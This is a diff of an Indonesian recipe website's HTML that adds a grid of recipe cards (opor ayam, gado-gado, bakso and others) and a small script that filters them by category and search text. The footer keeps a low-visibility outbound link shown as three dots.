+                  <a href="/olahan-ayam-kuah-pedas" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep olahan ayam nusantara: opor ayam kuning klasik - masakanku opor ayam kuning yang gurih dan lezat khas nusantara.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Olahan Ayam Nusantara: Opor Ayam Kuning Klasik - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/olahan-ayam-masakan-nusantara">Resep Olahan Ayam Nusantara: Opor Ayam Kuning Klasik - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Opor ayam kuning yang gurih dan lezat khas Nusantara.</p>
+                  <a href="/olahan-ayam-masakan-nusantara" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="olahan ayam goreng crispy untuk bekal sekolah anak yang bikin nagih - masakanku ayam crispy praktis buat bekal sekolah anak.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Olahan Ayam Goreng Crispy untuk Bekal Sekolah Anak yang Bikin Nagih - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/olahan-ayam-untuk-bekal">Olahan Ayam Goreng Crispy untuk Bekal Sekolah Anak yang Bikin Nagih - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Ayam crispy praktis buat bekal sekolah anak.</p>
+                  <a href="/olahan-ayam-untuk-bekal" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep mie goreng rumahan: lebih enak dari abang-abang! - masakanku resep mie goreng rumahan super praktis! pakai mie telur, sayuran, dan bumbu sederhana. cuma 15 menit jadi, rasanya juara!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Mie Goreng Rumahan: Lebih Enak dari Abang-Abang! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/mie-goreng">Resep Mie Goreng Rumahan: Lebih Enak dari Abang-Abang! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Resep mie goreng rumahan super praktis! Pakai mie telur, sayuran, dan bumbu sederhana. Cuma 15 menit jadi, rasanya ju...</p>
+                  <a href="/mie-goreng" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="olahan ayam goreng sisa: menghidupkan kembali sisa makanan - masakanku kreasi olahan dari sisa ayam goreng yang enak.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Olahan Ayam Goreng Sisa: Menghidupkan Kembali Sisa Makanan - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/olahan-ayam-goreng-sisa">Olahan Ayam Goreng Sisa: Menghidupkan Kembali Sisa Makanan - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Kreasi olahan dari sisa ayam goreng yang enak.</p>
+                  <a href="/olahan-ayam-goreng-sisa" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="olahan ayam kampung yang bikin nagih dan gampang dibuat - masakanku kreasi olahan ayam kampung yang variatif.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Olahan Ayam Kampung yang Bikin Nagih dan Gampang Dibuat - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/olahan-ayam-kampung-agar-tidak-bosan">Olahan Ayam Kampung yang Bikin Nagih dan Gampang Dibuat - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Kreasi olahan ayam kampung yang variatif.</p>
+                  <a href="/olahan-ayam-kampung-agar-tidak-bosan" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Resep" data-search="resep masakan padang sederhana jakarta yang menggugah selera - masakanku masakan padang khas jakarta yang praktis.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1466637574441-749b8f19452f?w=600&q=80" alt="Resep Masakan Padang Sederhana Jakarta yang Menggugah Selera - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Resep</span>
+                  <h5 class="card-title"><a href="/masakan-padang-sederhana-jakarta">Resep Masakan Padang Sederhana Jakarta yang Menggugah Selera - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Masakan Padang khas Jakarta yang praktis.</p>
+                  <a href="/masakan-padang-sederhana-jakarta" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Resep" data-search="masakan rumahan sederhana enak: resep dan cara memasak yang mudah - masakanku koleksi masakan rumahan sederhana untuk sehari-hari.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1466637574441-749b8f19452f?w=600&q=80" alt="Masakan Rumahan Sederhana Enak: Resep dan Cara Memasak yang Mudah - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Resep</span>
+                  <h5 class="card-title"><a href="/masakan-rumahan-sederhana-enak">Masakan Rumahan Sederhana Enak: Resep dan Cara Memasak yang Mudah - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Koleksi masakan rumahan sederhana untuk sehari-hari.</p>
+                  <a href="/masakan-rumahan-sederhana-enak" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sayur" data-search="resep gado-gado segar & lezat: siraman bumbu kacang juara - masakanku resep gado-gado sayuran segar dengan bumbu kacang kental. mudah dibuat, kaya gizi, dan cocok jadi menu makan siang sehat keluarga!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1540420773420-3366772f4999?w=600&q=80" alt="Resep Gado-Gado Segar & Lezat: Siraman Bumbu Kacang Juara - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sayur</span>
+                  <h5 class="card-title"><a href="/gado-gado">Resep Gado-Gado Segar & Lezat: Siraman Bumbu Kacang Juara - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Resep gado-gado sayuran segar dengan bumbu kacang kental. Mudah dibuat, kaya gizi, dan cocok jadi menu makan siang se...</p>
+                  <a href="/gado-gado" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Lainnya" data-search="cara membuat zuppa soup yang lezat dan menghangatkan - masakanku zuppa soup creamy dengan pastry renyah di atasnya.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1504674900247-0877df9cc836?w=600&q=80" alt="Cara Membuat Zuppa Soup yang Lezat dan Menghangatkan - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Lainnya</span>
+                  <h5 class="card-title"><a href="/cara-membuat-zuppa-soup">Cara Membuat Zuppa Soup yang Lezat dan Menghangatkan - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Zuppa soup creamy dengan pastry renyah di atasnya.</p>
+                  <a href="/cara-membuat-zuppa-soup" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="cara memasak ayam goreng lengkuas yang lezat dan mudah - masakanku ayam goreng lengkuas dengan bumbu rempah yang meresap.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Cara Memasak Ayam Goreng Lengkuas yang Lezat dan Mudah - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/cara-memasak-ayam-goreng-lengkuas">Cara Memasak Ayam Goreng Lengkuas yang Lezat dan Mudah - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Ayam goreng lengkuas dengan bumbu rempah yang meresap.</p>
+                  <a href="/cara-memasak-ayam-goreng-lengkuas" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Kue" data-search="cara membuat jenang sumsum yang lezat dan menggugah selera - masakanku jenang sumsum lembut manis gurih khas jawa.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1551024601-bec78aea704b?w=600&q=80" alt="Cara Membuat Jenang Sumsum yang Lezat dan Menggugah Selera - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Kue</span>
+                  <h5 class="card-title"><a href="/cara-membuat-jenang-sumsum">Cara Membuat Jenang Sumsum yang Lezat dan Menggugah Selera - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Jenang sumsum lembut manis gurih khas Jawa.</p>
+                  <a href="/cara-membuat-jenang-sumsum" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sapi" data-search="cara membuat yogurt dari susu sapi di rumah, mudah dan sehat! - masakanku yogurt homemade segar dan sehat dari susu sapi.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1558030089-654c1e967069?w=600&q=80" alt="Cara Membuat Yogurt dari Susu Sapi di Rumah, Mudah dan Sehat! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sapi</span>
+                  <h5 class="card-title"><a href="/cara-membuat-yogurt-dari-susu-sapi">Cara Membuat Yogurt dari Susu Sapi di Rumah, Mudah dan Sehat! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Yogurt homemade segar dan sehat dari susu sapi.</p>
+                  <a href="/cara-membuat-yogurt-dari-susu-sapi" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sapi" data-search="resep bakso sapi homemade: kenyal, gurih, kuah bening nagih! - masakanku resep bakso sapi homemade yang kenyal dan gurih. dilengkapi kuah kaldu sapi bening yang segar. buat sendiri di rumah, lebih puas!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1558030089-654c1e967069?w=600&q=80" alt="Resep Bakso Sapi Homemade: Kenyal, Gurih, Kuah Bening Nagih! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sapi</span>
+                  <h5 class="card-title"><a href="/bakso-sapi">Resep Bakso Sapi Homemade: Kenyal, Gurih, Kuah Bening Nagih! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Resep bakso sapi homemade yang kenyal dan gurih. Dilengkapi kuah kaldu sapi bening yang segar. Buat sendiri di rumah,...</p>
+                  <a href="/bakso-sapi" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep capcay goreng sayuran: sehat, cepat, enak banget! - masakanku resep capcay goreng sayuran lengkap dengan bakso dan ayam. cuma 15 menit jadi, cocok buat makan malam praktis sekeluarga!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Capcay Goreng Sayuran: Sehat, Cepat, Enak Banget! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/capcay-goreng">Resep Capcay Goreng Sayuran: Sehat, Cepat, Enak Banget! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Resep capcay goreng sayuran lengkap dengan bakso dan ayam. Cuma 15 menit jadi, cocok buat makan malam praktis sekelua...</p>
+                  <a href="/capcay-goreng" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="cara buat ayam goreng berempah sedap dan lezat - masakanku ayam goreng berempah dengan rempah pilihan.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Cara Buat Ayam Goreng Berempah Sedap dan Lezat - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/cara-buat-ayam-goreng-berempah">Cara Buat Ayam Goreng Berempah Sedap dan Lezat - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Ayam goreng berempah dengan rempah pilihan.</p>
+                  <a href="/cara-buat-ayam-goreng-berempah" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="ayam beku tahan berapa lama? panduan lengkap menyimpan aman - masakanku tips menyimpan ayam beku yang aman dan anti busuk.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Ayam Beku Tahan Berapa Lama? Panduan Lengkap Menyimpan Aman - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/ayam-beku-tahan-berapa-lama">Ayam Beku Tahan Berapa Lama? Panduan Lengkap Menyimpan Aman - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Tips menyimpan ayam beku yang aman dan anti busuk.</p>
+                  <a href="/ayam-beku-tahan-berapa-lama" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="ayam goreng mangga besar: resep klasik dengan sentuhan modern - masakanku perpaduan unik ayam goreng dengan saus mangga.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Ayam Goreng Mangga Besar: Resep Klasik dengan Sentuhan Modern - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/ayam-goreng-mangga-besar">Ayam Goreng Mangga Besar: Resep Klasik dengan Sentuhan Modern - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Perpaduan unik ayam goreng dengan saus mangga.</p>
+                  <a href="/ayam-goreng-mangga-besar" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep ayam penyet pedas: sambal terasi bikin makan ketagihan! - masakanku resep ayam penyet sambal terasi super pedas. ayam goreng tepung crispy, dipenyet sama sambal mentah yang nampol. wajib coba!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Ayam Penyet Pedas: Sambal Terasi Bikin Makan Ketagihan! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/ayam-penyet">Resep Ayam Penyet Pedas: Sambal Terasi Bikin Makan Ketagihan! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Resep ayam penyet sambal terasi super pedas. Ayam goreng tepung crispy, dipenyet sama sambal mentah yang nampol. Waji...</p>
+                  <a href="/ayam-penyet" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+  </div>
 </div>
 
 <footer>
@@ -405,9 +1439,43 @@
 <p class="small text-muted"><a href="https://jabturfembitter.com/eqpmnn1p?key=d62af6…d40b" target="_blank" rel="nofollow" style="color:#888;">&#9679; &#9679; &#9679;</a></p>
 </footer>
 
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-<script>
-    document.querySelectorAll('a[href^="http"]').forEach(el => el.setAttribute('target', '_blank'));
-</script>
+  <script>
+    const searchInput = document.getElementById('searchInput');
+    const clearBtn = document.getElementById('clearBtn');
+    const articleGrid = document.getElementById('articleGrid');
+    const articleCount = document.getElementById('articleCount');
+    let activeCategory = 'all';
+
+    function filterArticles() {
+      const q = searchInput.value.trim().toLowerCase();
+      const cards = articleGrid.querySelectorAll('.article-card');
+      let visible = 0;
+      cards.forEach(card => {
+        const cat = card.dataset.category;
+        const search = card.dataset.search || '';
+        const matchCat = activeCategory === 'all' || cat === activeCategory;
+        const matchSearch = q === '' || search.includes(q);
+        card.classList.toggle('hidden', !(matchCat && matchSearch));
+        if (matchCat && matchSearch) visible++;
+      });
+      articleCount.innerHTML = 'Menampilkan <strong>' + visible + '</strong> resep';
+      clearBtn.style.display = q ? 'block' : 'none';
+    }
+
+    searchInput.addEventListener('input', filterArticles);
+
+    window.filterCategory = function(cat) {
+      activeCategory = cat;
+      document.querySelectorAll('.btn-cat').forEach(b => b.classList.remove('active'));
+      event.target.classList.add('active');
+      filterArticles();
+    };
+
+    window.clearSearch = function() {
+      searchInput.value = '';
+      filterArticles();
+      searchInput.focus();
+    };
+  </script>
 </body>
 </html>
